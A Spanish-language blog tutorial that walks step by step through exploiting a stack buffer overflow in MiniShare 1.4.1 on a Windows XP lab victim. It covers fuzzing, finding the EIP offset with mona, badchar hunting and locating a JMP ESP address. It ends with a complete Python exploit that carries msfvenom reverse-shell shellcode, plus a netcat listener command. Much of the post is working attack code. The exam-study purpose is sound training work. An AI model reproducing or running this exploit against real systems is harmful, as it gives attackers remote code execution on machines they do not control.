---
layout: single
title: Buffer Overflow - MiniShare 1.4.1
comments: true
excerpt: "Primer Post, les escribo un tutorial como hacer un buffer overflow exitoso. Muy recomendado para la OSCP"
date: 2020-10-04
classes: wide
header:
  teaser: /assets/images/buffer-overflow-minishare/title-buffer-overflow-minishare.jpg
  teaser_home_page: true
categories:
  - Exploiting
tags:
  - OSCP
  - Exploiting
---

![](/assets/images/buffer-overflow-minishare/title-buffer-overflow-minishare.jpg)

Ya hace un buen tiempo que no escribia o hacia un video en ninguna plataforma, pero compartir lo aprendido siempre a sido una caracteristica esensial de la comunidad y esta de mas decir que sin tanto contenido respecto al Hacking o Reversing hoy no seriamos nada, Asi pues aprovechare para  ir aportando contenido y espero que alguien le sirva.

En este articulo haremos un buffer overflow al software Minishare 1.4.1, desbordaremos el buffer y aprovecharemos esa vulnerabilidad para ejecutar una shell que se conecte a la maquina atacante.

#### Requisitos 

- Immunity Debugger ( Plugin Mona )
- Windows XP sp1 (Victima)
- Kali Linux ( Atacante ) 

#### Escanear Maquina Victima

Para comenzar vamos a escanear con nmap a la maquina victima y podremos ver que tenemos el puerto 80 usado por Minishare 1.4.1

```bash
nmap -sS -sV -p- --open 192.168.1.34 -Pn
```

<p align="center">
<img src="/assets/images/buffer-overflow-minishare/scan-nmap-minishare.jpg">
</p>

#### Creando Template

Entonces vamos a crear un script y ver como reacciona la aplicacion al mandarle unas strings 

```python
#!/usr/local/bin
import socket

ip = '192.168.1.34'
port = 80

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
buffer = 'GET ' + 'A'*8000 + 'HTTP/1.1\r\n\r\n'
s.send(buffer)
s.close()
```

como podemos ver el programa crasheo en algun punto pero lo interesante es que EIP apunta 41414141 y que se sobrescribio la pila con 41414141("AAAA").

<p align="center">
<img src="/assets/images/buffer-overflow-minishare/crash.jpg">
</p>


#### Fuzzing

Entonces ahora enviaremos datos aleatorios para ver en cuantos bytes crashea la aplicacion

```python
#!/usr/local/bin
import socket

ip = '192.168.1.34'
port = 80

buffer = ['A']
count = 100

# Generamos un array de strings para el fuzzing
while len(buffer) < 32:
	buffer.append( "A" * count)
	count +=100

# Mandando String al buffer
for string in buffer:
	try:
		print("Bytes enviados %i" % (len(string)))
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((ip, port))		
		s.send('GET ' + string + 'HTTP/1.1\r\n\r\n')		
		s.close()
	except:
		print("Error en conexion!")
```

como podemos ver mandamos en cada ciclo 100 'A's y la aplicacion crasheo en 3100 bytes 'A's enviados

<p align="center">
<img src="/assets/images/buffer-overflow-minishare/bytes_enviados.jpg">
</p>

#### Find EIP

Ya sabemos que la aplicacion crashea en 3100 'A's y EIP sigue apuntando en 41414141. Entonces ahora nesecitamos saber cuantos bytes son nesecarios para poder pisar EIP que nos servira para controlar el flujo de la aplicacion, para esto enviaremos un patron de bytes unico que nos servira para calcular en cuantos bytes hacernos con la EIP.

hay herramientas para esto como: 
- msf-pattern_create, msf-pattern_offset ( vienen en Kali o Parrot por Defecto)
- https://github.com/Svenito/exploit-pattern
- Plugin Mona

yo usare mona para este fin pero antes nesecitare ejecutar este comando en immunity debugger para que mona sepa donde sera mi carpeta de trabajo

```bash
!mona config -set workingfolder C:\mona\%p
```
<p align="center">
<img src="/assets/images/buffer-overflow-minishare/working-folder.jpg">
</p>

Crearemos un pattern de 3100 bytes

```bash
!mona pc 3100
```
<p align="center">
<img src="/assets/images/buffer-overflow-minishare/pattern.jpg">
</p>

 abrimos el archivo que nos creo y copiamos el pattern para posteriormente usarlo en nuestro script

```python
#!/usr/local/bin
import socket

ip = '192.168.1.34'
port = 80

buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2D"

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port))		
	s.send('GET ' + buffer + 'HTTP/1.1\r\n\r\n')		
	s.close()
except:
	print("Error en conexion!")
```

Al correr nuestro script vemos que paro de nuevo pero en esta ocasion EIP apunta a otros bytes. Asi que ejecutemos este comando

```bash
!mona findmsp
```

<p align="center">
<img src="/assets/images/buffer-overflow-minishare/offset-eip.jpg">
</p>

como podemos ver mona nos dice que nesecitamos 1787 bytes para llegar EIP, asi que esto lo vamos a comprobar en nuestro script para pisar EIP con unos BBBB


```python
#!/usr/local/bin
import socket

ip = '192.168.1.34'
port = 80

junk = "A" * 1787
eip  = "B" * 4
buffer = junk + eip

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port))		
	s.send('GET ' + buffer + 'HTTP/1.1\r\n\r\n')		
	s.close()
except:
	print("Error en conexion!")
```

Genial pudimos pisar el EIP con unos BBBB 

<p align="center">
<img src="/assets/images/buffer-overflow-minishare/pisado-eip.jpg">
</p>

#### Badchards

En esta parte nesecitamos encontrar los badchards y nos hacemos la pregunta que son ? La respuesta es sencilla nuestro objetivo es usar una shellcode en nuestro script que nos permita conectarse a nuestra maquina. Sin embargo existen caracteres malos en la aplicacion que cortaran nuestra shellcode como por ejemplo \x00. Entonces sera un trabajo repetivo pero debemos encontrarlos a todos enviando una lista de bytes desde 0 (\x00) hasta 255 (\xff) y ver en donde se corta. Asi de esta manera omitiremos estos badchars en nuestra shellcode.

Asi que ejecutaremos en mona el siguiente comando para que nos genere un byterray de badchars 

```bash
!mona bytearray
```

copiaremos los badchars del archivo que creo mona a nuestro script

```python
#!/usr/local/bin
import socket

ip = '192.168.1.34'
port = 80

junk = "A" * 1787
eip  = "B" * 4
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
buffer = junk + eip + badchars

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port))		
	s.send('GET ' + buffer + 'HTTP/1.1\r\n\r\n')		
	s.close()
except:
	print("Error en conexion!")
```

Al ejecutar nuestro script podemos ver que no notamos nada diferente pero bueno la idea es que ejecutaremos un comando para que mona nos detecte el badchar


```bash
!mona compare esp -f C:\mona\minishare\bytearray.bin -a DireccionESP
```

Como podemos ver mona nos indica cual es el badchar

<p align="center">
<img src="/assets/images/buffer-overflow-minishare/badchar1.jpg">
</p>


Entonces eliminaremos dicho badchar de nuestro script y generaremos otro excluyendo \x00

```bash
!mona byterray -cpb \x00
```

Repetiremos el mismo proceso hasta que mona ya no nos arroje mas badchars, como resultado solo tenemos dos badchars \x00\x0d

<p align="center">
<img src="/assets/images/buffer-overflow-minishare/not-badchars.jpg">
</p>

#### JMP ESP

Ahora nesecitaremos buscar una direccion que contenga un jmp esp libre de protecciones para poder ejecutar nuestra shellcode, esto lo haremos ejecutando el comando copiaremos dicha direccion para usarlo en nuestro script

```bash
!mona jmp -r esp
```

<p align="center">
<img src="/assets/images/buffer-overflow-minishare/jmp-esp.jpg">
</p>

copiaremos dicha direccion para usarlo en nuestro script, para ello usaremos la libreria struct para no tener problemas con el litle endian

```python
#!/usr/local/bin
import socket
import struct

ip = '192.168.1.25'
port = 80

junk = "A" * 1787

buffer = junk + struct.pack('<L', 0x7C9D30D7) + "C" * 100 # Agregamos unos C's a modo de prueba
try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port))		
	s.send('GET ' + buffer + 'HTTP/1.1\r\n\r\n')		
	s.close()
except:
	print("Error en conexion!")
```



#### Shellcode

llegamos a la parte mas importante generar nuestra shellcode lo haremos de esta forma con este comando

```bash
msfvenom -p windows/shell_reverse_tcp lhost=IpAtacante lport=4444 EXITFUNC=thread -a x86 --platform windows -b "\x00\x0d" -e x86/shikata_ga_nai -f c
```

<p align="center">
<img src="/assets/images/buffer-overflow-minishare/shellcode.jpg">
</p>


#### Creando Exploit

Genial muchachos ya tenemos todo lo nesecario para crear nuestro exploit que se genere una shell remota, para esto nesecitaremos copiar la shell que generamos en nuestro script 

```python
#!/usr/local/bin
import socket
import struct

ip = '192.168.1.25' # ip victima
port = 80

junk = "A" * 1787
shellcode = (
"\xbd\xa8\xfa\xbe\xbd\xda\xc9\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x52\x83\xc2\x04\x31\x6a\x0e\x03\xc2\xf4\x5c\x48\xee\xe1\x23"
"\xb3\x0e\xf2\x43\x3d\xeb\xc3\x43\x59\x78\x73\x74\x29\x2c\x78"
"\xff\x7f\xc4\x0b\x8d\x57\xeb\xbc\x38\x8e\xc2\x3d\x10\xf2\x45"
"\xbe\x6b\x27\xa5\xff\xa3\x3a\xa4\x38\xd9\xb7\xf4\x91\x95\x6a"
"\xe8\x96\xe0\xb6\x83\xe5\xe5\xbe\x70\xbd\x04\xee\x27\xb5\x5e"
"\x30\xc6\x1a\xeb\x79\xd0\x7f\xd6\x30\x6b\x4b\xac\xc2\xbd\x85"
"\x4d\x68\x80\x29\xbc\x70\xc5\x8e\x5f\x07\x3f\xed\xe2\x10\x84"
"\x8f\x38\x94\x1e\x37\xca\x0e\xfa\xc9\x1f\xc8\x89\xc6\xd4\x9e"
"\xd5\xca\xeb\x73\x6e\xf6\x60\x72\xa0\x7e\x32\x51\x64\xda\xe0"
"\xf8\x3d\x86\x47\x04\x5d\x69\x37\xa0\x16\x84\x2c\xd9\x75\xc1"
"\x81\xd0\x85\x11\x8e\x63\xf6\x23\x11\xd8\x90\x0f\xda\xc6\x67"
"\x6f\xf1\xbf\xf7\x8e\xfa\xbf\xde\x54\xae\xef\x48\x7c\xcf\x7b"
"\x88\x81\x1a\x2b\xd8\x2d\xf5\x8c\x88\x8d\xa5\x64\xc2\x01\x99"
"\x95\xed\xcb\xb2\x3c\x14\x9c\x7c\x68\x17\x61\x15\x6b\x17\x88"
"\xb9\xe2\xf1\xc0\x51\xa3\xaa\x7c\xcb\xee\x20\x1c\x14\x25\x4d"
"\x1e\x9e\xca\xb2\xd1\x57\xa6\xa0\x86\x97\xfd\x9a\x01\xa7\x2b"
"\xb2\xce\x3a\xb0\x42\x98\x26\x6f\x15\xcd\x99\x66\xf3\xe3\x80"
"\xd0\xe1\xf9\x55\x1a\xa1\x25\xa6\xa5\x28\xab\x92\x81\x3a\x75"
"\x1a\x8e\x6e\x29\x4d\x58\xd8\x8f\x27\x2a\xb2\x59\x9b\xe4\x52"
"\x1f\xd7\x36\x24\x20\x32\xc1\xc8\x91\xeb\x94\xf7\x1e\x7c\x11"
"\x80\x42\x1c\xde\x5b\xc7\x3c\x3d\x49\x32\xd5\x98\x18\xff\xb8"
"\x1a\xf7\x3c\xc5\x98\xfd\xbc\x32\x80\x74\xb8\x7f\x06\x65\xb0"
"\x10\xe3\x89\x67\x10\x26")
buffer = junk + struct.pack('<L', 0x7C9D30D7) + "\x90"*20 + shellcode
try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port))		
	s.send('GET ' + buffer + 'HTTP/1.1\r\n\r\n')		
	s.close()
except:
	print("Error en conexion!")
```

como ven agregamos antes unos nop's para no tener problemas al ejecutar nuestra shellcode

#### Ejecutar Exploit

Para hacer funcionar nuestro exploit nesecitamos dejar en escucha el puerto 4444 (Puede ser cualquier puerto yo lo puse asi al generar la shellcode con msfvenom)

```bash
nc -nlvp 4444
```

ahora correr nuestro exploit

<p align="center">
<img src="/assets/images/buffer-overflow-minishare/shell-reverse.jpg">
</p>


listo como podemos ver ya pudimos conectacnos con la maquina victima y hemos podido crear un exploit exitosamente. 

Espero que les haya gustado este escrito tanto como a mi me gusto escribirlo. Nos vemos AbelJM 